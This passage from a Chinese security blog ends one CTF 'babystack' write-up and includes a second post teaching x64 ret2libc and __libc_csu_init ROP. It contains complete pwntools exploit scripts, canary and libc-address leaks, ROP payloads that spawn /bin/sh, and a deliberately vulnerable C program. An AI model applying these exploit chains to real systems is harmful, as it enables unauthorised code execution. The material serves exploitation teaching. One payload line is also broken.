<p>&emsp;&emsp;接着case 2打印canary，第二步，我们要通过rop来泄露system与bin_sh的地址。查询后发现了比较好用的 <code>pop rdi ; ret</code> .这个时候payload已经基本清楚了，用puts泄漏计算偏移，然后case 3退出是返回到main，接着case 3退出返回到system。  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_4.png?raw=true" alt="rop"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#  sh = process('./babystack')</span></span><br><span class="line">sh = remote(<span class="string">'111.198.29.45'</span>,<span class="number">35646</span>) </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_libc = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x00400a93</span></span><br><span class="line">main = <span class="number">0x00400908</span></span><br><span class="line">log.info(<span class="string">'puts_got '</span> + hex(puts_got))</span><br><span class="line">log.info(<span class="string">'puts_plt '</span> + hex(puts_plt))</span><br><span class="line">log.info(<span class="string">'puts_libc '</span> + hex(puts_libc))</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'a'</span> * <span class="number">136</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get_canary</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.sendline(padding)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'a'</span> * <span class="number">136</span>)</span><br><span class="line">canary = u64(sh.recv()[:<span class="number">8</span>]) - <span class="number">0xa</span></span><br><span class="line">log.info(<span class="string">'canary '</span> + hex(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_system</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTarget</span><span class="params">(target, canary)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * (<span class="number">0x90</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">'b'</span> * <span class="number">8</span> + p64(pop_rdi) + p64(target) + p64(puts_plt)</span><br><span class="line">    payload += p64(main)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    <span class="comment">#  sh.recvuntil('b'*8)</span></span><br><span class="line">    addr = u64(sh.recv()[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'\n'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">puts_addr = getTarget(puts_got, canary)</span><br><span class="line">log.info(<span class="string">'puts_addr '</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_offset_system_bin_sh </span></span><br><span class="line">offset = puts_addr - puts_libc</span><br><span class="line">system_addr = system_libc + offset </span><br><span class="line">bin_sh = offset + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">log.info(<span class="string">'system_addr '</span> + hex(system_addr))</span><br><span class="line">log.info(<span class="string">'bin_sh '</span> + hex(bin_sh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fuckup</span></span><br><span class="line">sh.sendline(<span class="string">'\n'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x90</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">'b'</span> * <span class="number">8</span> + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">payload += p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在输入输出那里比较坑，需要多调几下。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-04-11</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/04/11/关于libc与rop的思考/">关于libc与rop的思考</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="那些奇妙的组合"><a href="#那些奇妙的组合" class="headerlink" title="那些奇妙的组合"></a>那些奇妙的组合</h3><hr>
<p>&emsp;&emsp;这两天读了一些书，学了一些新的知识，关于libc我们比较熟悉的是通过<strong>write()</strong> <strong>puts()</strong>等函数来泄漏<strong>system()</strong>和<strong>/bin/sh</strong>的实际地址，然后通过缓冲区溢出来进行利用，这是常见而基础的ret2libc。<br>&emsp;&emsp;但是我们来想想这几种情况，假如程序是64位那么我们如何将参数传入函数，假如我们没有拿到libc.so那么我们如何计算偏移，一般来说处理这中情况往往需要一些骚操作，以rop来实现libc泄漏往往是绕不过的。举个简单例子，在x86中write()传参是这样的：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x80</span> + p32(write_got) + p32(vuln) + p32(<span class="number">0</span>) + p32(address_to_leak) + p32(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;通过调用write函数来泄漏address_to_leak的真实地址，一般我们会选择write_got自己或者libc_start_main_got来进行泄漏，因为 <strong>延迟绑定</strong> 的原因，只有被调用过的函数，他的got表里才会储存该函数在内存中的实际地址。  </p>
<blockquote>
<p>关于这一部分大家可以读一度《程序员的自我修养这本书》，还有下面这篇文章：<br><a href="https://www.freebuf.com/articles/system/135685.html" target="_blank" rel="noopener">got&amp;plt</a><br>详细的介绍了got与plt以及延迟绑定的问题  </p>
</blockquote>
<p>&emsp;&emsp;我们现在就来总结一下如何处理x64的libc泄漏问题。  </p>
<h4 id="1-直接寻找可用于传参的budget"><a href="#1-直接寻找可用于传参的budget" class="headerlink" title="1.直接寻找可用于传参的budget"></a>1.直接寻找可用于传参的budget</h4><p>&emsp;&emsp;既然要泄漏地址，那么必然要使用write()与puts()等函数，这个过程就涉及到参数的传递，不像x86那样可以用栈传递参数，x64拥有更多的寄存器，所以会优先选择使用寄存器来传递参数，关于寄存器我们需要将一下传参规则，先看下图：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/register.png?raw=true" alt="register"></p>
<p>&emsp;&emsp;我们可以看到64位的程序的参数在6个以内时会优先调用寄存器，而使用的顺序如下：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%rdi =&gt; arg1</span><br><span class="line"></span><br><span class="line">%rsi =&gt; arg2</span><br><span class="line"></span><br><span class="line">%rdx =&gt; arg3</span><br><span class="line"></span><br><span class="line">%rcx =&gt; arg4</span><br><span class="line"></span><br><span class="line">%r8 =&gt; arg5</span><br><span class="line"></span><br><span class="line">%r9 =&gt; arg6</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;而 <strong><em>%rax</em></strong> 依旧用于保存返回值。知道这些储备知识以后，我们来开一个使用gadgets来控制程序的例子。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gcc -fno-stack-procter -no-pie -o rop_libc rop_libc1</p>
</blockquote>
<p>&emsp;&emsp;我们首先可以看到一个明显的缓冲区溢出，而且程序会自动输出system()在内存中的实际地址，这个时候我们可以想到只需要拥有 <strong>“/bin/sh”</strong> 就可以走上人生巅峰，这个时候我们考虑使用gadgets来将 <strong>“/bin/sh”</strong> 的地址传入 <strong>rdi</strong>。ok，用ROPgadget来搜索一波：  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget 	--binary rop_libc1  --only "pop|ret"</span><br><span class="line">====================================================</span><br><span class="line">0x0000000000001294 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000001296 : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000001298 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000000129a : pop r15 ; ret</span><br><span class="line">0x0000000000001293 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000001297 : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000000116f : pop rbp ; ret</span><br><span class="line">0x000000000000129b : pop rdx ; ret</span><br><span class="line">0x0000000000001299 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000001295 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000001016 : ret</span><br><span class="line">0x0000000000001072 : ret 0x2f</span><br><span class="line">0x000000000000119a : ret 0xfffe</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们发现结果并不理想，由于这个程序太小了，里面竟然没有 <strong>pop rdi ; ret</strong> 这条指令，那么我们只好换个思路，为什么不直接使用libc.so里的gadgets呢？灵机一动之后，我们想到可用使用write()来泄漏libc.so里的指令地址，话不多说，先搜一下symbols地址：  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only "pop|ret" </span><br><span class="line">=====================================================</span><br><span class="line">0x000000000002456f : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000023a5f : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;果然命中注定的那个它出现了，<strong>0x23a5f：pop rdi ; ret </strong> 就是我们想要的gadgets，我们可以构造rop链了。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x80</span> + <span class="string">'b'</span> * <span class="string">'8'</span> + p64(pop_ret_addr) + p64(bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;但同时考虑到我们只需要执行system一次，所以似乎gadgets不含有ret也可以，那么我们的选择又多了一些：  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only "pop|call"</span><br><span class="line">====================================================</span><br><span class="line">0x00000000000bad0d : call qword ptr [rdi]</span><br><span class="line">0x0000000000027225 : call rdi</span><br><span class="line">0x00000000000f982b : pop rax ; pop rdi ; call rax</span><br><span class="line">0x00000000000f982c : pop rdi ; call rax</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这时候我们看到了 <strong>0x00f982b : pop rax ; pop rdi ; call rax</strong> 这行指令应该也是可以的，我们只需要构造payload如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x80</span> + <span class="string">'b'</span> * <span class="number">8</span> + p64(pop_pop_call) + p64(system_addr) + p64(bin_sh)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;此时system_addr被传入rax，bin_sh被传入rdi，最后调用call rax实现exploit，所以两条ROP都可以完成一次优雅的攻击，最终的exp如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop_libc'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x000011db</span></span><br><span class="line"></span><br><span class="line">system_addr_str = sh.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">system_addr = int(system_addr_str,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">pop_pop_call_offset = <span class="number">0x00000000000f982b</span> - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pop_offset= "</span> + hex(pop_pop_call_offset)</span><br><span class="line"></span><br><span class="line">bin_sh_offset = <span class="number">0x0000000000181519</span> - libc.symbols[<span class="string">'system'</span>] <span class="comment"># libc.search('/bin/sh').next()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_sh_offset= "</span> + hex(bin_sh_offset)</span><br><span class="line"></span><br><span class="line">pop_pop_call_addr = system_addr + pop_pop_call_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pop_addr= "</span> + hex(pop_pop_call_addr)</span><br><span class="line"><span class="comment">#pop_pop_call_addr = system_addr + pop_pop_call_offset</span></span><br><span class="line"><span class="comment">#print "pop_pop_call_addr = " + hex(pop_pop_call_addr)</span></span><br><span class="line"></span><br><span class="line">bin_sh = system_addr + bin_sh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_sh= "</span> + hex(bin_sh)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> +  p64(pop_pop_call_addr) + p64(system_addr) + p64(bin_sh)</span><br><span class="line"><span class="comment">#payload = "a" * 0x80 + 'b' * '8' + p64(pop_ret_addr) + p64(bin_sh) + p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload) </span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/rop_libc.png?raw=true" alt="result">  </p>
<h4 id="2-通用gadgets"><a href="#2-通用gadgets" class="headerlink" title="2.通用gadgets"></a>2.通用gadgets</h4><p>&emsp;&emsp;假如我们出现了更艰难的情况，我们需要传入更多的参数进去，比如write(),这时候要怎么办？我们查一下libc.so发现什么都没有，有点难受：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000106ab4 : pop r10 ; ret</span><br><span class="line">0x0000000000024568 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x0000000000023a58 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000006f529 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x000000000002fc29 : pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000000396f5 : pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="line">0x0000000000023f85 : pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b5399 : pop r12 ; pop r14 ; ret</span><br><span class="line">0x00000000000c513d : pop r12 ; pop rbp ; ret</span><br><span class="line">0x0000000000024209 : pop r12 ; ret</span><br><span class="line">0x000000000002456a : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x0000000000023a5a : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000006f52b : pop r13 ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x000000000002fc2b : pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000000396f7 : pop r13 ; pop rbp ; ret</span><br><span class="line">0x0000000000023f87 : pop r13 ; ret</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;不太全但是可以发现几乎没有关于rdi等等有关参数的寄存器，这个时候我们就要采取一些骚办法.  </p>
<blockquote>
<p>__libc_csu_init  </p>
</blockquote>
<p>&emsp;&emsp;这个函数在大部分程序初始化的时候都会出现，我们首先来看一下这个函数的源码：  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rop_libc</span><br><span class="line">====================================================</span><br><span class="line"></span><br><span class="line">0000000000001240 &lt;__libc_csu_init&gt;:</span><br><span class="line">    1240:       41 57                   push   %r15</span><br><span class="line">    1242:       49 89 d7                mov    %rdx,%r15</span><br><span class="line">    1245:       41 56                   push   %r14</span><br><span class="line">    1247:       49 89 f6                mov    %rsi,%r14</span><br><span class="line">    124a:       41 55                   push   %r13</span><br><span class="line">    124c:       41 89 fd                mov    %edi,%r13d</span><br><span class="line">    124f:       41 54                   push   %r12</span><br><span class="line">    1251:       4c 8d 25 80 2b 00 00    lea    0x2b80(%rip),%r12        # 3dd8 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">						</span><br><span class="line">						..........</span><br><span class="line">						#以下是关键</span><br><span class="line">    #gadget2</span><br><span class="line">    1278:       4c 89 fa                mov    %r15,%rdx</span><br><span class="line">    127b:       4c 89 f6                mov    %r14,%rsi</span><br><span class="line">    127e:       44 89 ef                mov    %r13d,%edi</span><br><span class="line">    1281:       41 ff 14 dc             callq  *(%r12,%rbx,8)</span><br><span class="line">    1285:       48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">    1289:       48 39 dd                cmp    %rbx,%rbp</span><br><span class="line">    128c:       75 ea                   jne    1278 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">    128e:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">   </span><br><span class="line"><span class="meta">   #</span><span class="bash">gadget1</span></span><br><span class="line">   1292:       5b                      pop    %rbx</span><br><span class="line">   1293:       5d                      pop    %rbp</span><br><span class="line">   1294:       41 5c                 pop    %r12</span><br><span class="line">   1296:       41 5d                pop    %r13</span><br><span class="line">   1298:       41 5e                pop    %r14</span><br><span class="line">   129a:       41 5f                 pop    %r15</span><br><span class="line">   129c:       c3                      retq   #此处构造一些padding(7*8=56byte)就可以返回了</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;首先我们来看一下gadgets1，pop了一堆东西进到寄存器里，然后控制ret到gadget2,此时我们便可以看出其中的玄机，gadget1中pop进寄存器的值竟然被传进了我们梦寐以求的rdi rsi rdx 三个参数寄存器，然后接下来 <code>callq *(%r12,%rbx,8)</code> 会调用 <strong>[$r12 + rbx*8]</strong> 处的函数,之后进行 rbx += 1,然后比较rbx与rbp的值，如果想等那么就继续向下进行，并且ret到我们想要继续执行的位置。到这，我就可以开始思考如何给gadget1传参数了，反复思索后：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$rbx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">$rbp = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">$r12 = callee <span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">$r13 = arg1			$r14 = arg2				$r15 = arg3</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里需要注意的是需要构造56个padding，因为进行了6次pop和一次ret，使得rsp增大了56bytes。  </p>
</blockquote>
<p>&emsp;&emsp;这个时候我们精心设计的rop链就可以执行传递多个参数的复杂操作了。</p>
<p>&emsp;&emsp;下面我们来看一道题：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;乍一看除了write()和read()啥也没有，可以想到应该是libc泄漏，搜了一波发现没啥好用的gadgets，行吧，__libc_csu_init走起。由于write()函数被调用过，所以我们考虑根据write()来计算偏移：  </p>
<p>&emsp;&emsp;我们先构造payload1,利用write()函数来泄漏write自己在内存里的位置，然后返回到程序里，继续覆盖栈上的数据，直到回到main函数来继续进行后续操作：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get the address of write</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span>  + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x4011c8</span>) + <span class="string">'d'</span> * <span class="number">56</span> + p64(main)</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;当我们收到write的地址后，我们便能够计算出system()在内存中的地址了。我们便构造payload2使用read()函数来将算出的system()与/bin/sh写入bss段：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get the address of system and bin_sh</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">1</span>) + p64(bss) + p64(<span class="number">16</span>) + p64(<span class="number">0x4011c8</span>) + <span class="string">'d'</span>*<span class="number">56</span> + p64(main)</span><br></pre></td></tr></table></figure>
<p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。 </p>
